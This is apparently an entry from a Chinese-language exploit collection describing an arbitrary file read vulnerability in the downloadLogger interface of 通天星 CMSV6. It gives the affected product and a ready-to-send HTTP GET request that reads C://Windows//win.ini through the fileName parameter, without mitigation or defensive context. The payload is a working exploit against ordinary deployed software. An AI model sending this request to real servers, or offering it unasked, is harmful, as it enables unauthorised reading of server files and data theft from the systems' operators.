**漏洞描述：**

通天星CMSV6接口downloadLogger任意文件读取漏洞，攻击者可以通过接口读取任意服务器文件。

**影响版本：**

通天星CMSV6

**Payload：**

```jsx
GET/808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1
Host:127.0.0.1
User-Agent:Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept:*/*
Connection:Keep-Alive
```

---
